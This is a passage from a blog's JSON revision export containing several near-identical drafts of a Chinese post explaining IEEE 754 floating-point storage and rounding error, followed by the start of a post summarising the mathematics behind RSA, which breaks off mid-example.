超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"* 参考文献: [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]]]}","created_at_ts":1567345393805,"created_at":"2019-09-01 13:43:13"},{"id":"5d6bcb033faccd0001d04fa6","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"* 参考文献: [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]],[1,\"p\",[]]]}","created_at_ts":1567345411829,"created_at":"2019-09-01 13:43:31"},{"id":"5d6bcb083faccd0001d04fa8","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"* 参考文献: [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\\n* https://blog.csdn.net/kisimple/article/details/43773899\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]],[1,\"p\",[]]]}","created_at_ts":1567345416051,"created_at":"2019-09-01 13:43:36"},{"id":"5d6bcb0d3faccd0001d04faa","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"参考文献: \\n* [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\\n* https://blog.csdn.net/kisimple/article/details/43773899\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]],[1,\"p\",[]]]}","created_at_ts":1567345421878,"created_at":"2019-09-01 13:43:41"},{"id":"5d6bcb1a3faccd0001d04fac","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"参考文献: \\n* [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\\n* [](https://blog.csdn.net/kisimple/article/details/43773899)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]],[1,\"p\",[]]]}","created_at_ts":1567345434498,"created_at":"2019-09-01 13:43:54"},{"id":"5d6bcb233faccd0001d04fae","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数,最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"参考资料: \\n* [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\\n* [Java的BigDecimal如何解决浮点数精度问题](https://blog.csdn.net/kisimple/article/details/43773899)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]],[1,\"p\",[]]]}","created_at_ts":1567345443091,"created_at":"2019-09-01 13:44:03"},{"id":"5d6bcb4a3faccd0001d04fb2","post_id":"5cfa089b31767300013e0e85","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数, 最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"参考资料: \\n* [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\\n* [Java的BigDecimal如何解决浮点数精度问题](https://blog.csdn.net/kisimple/article/details/43773899)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]],[1,\"p\",[]]]}","created_at_ts":1567345482605,"created_at":"2019-09-01 13:44:42"},{"id":"5d7bb3ce3faccd0001d052c7","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一名每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有一种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n\\n好了，真正巧妙的就在这里了: \\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 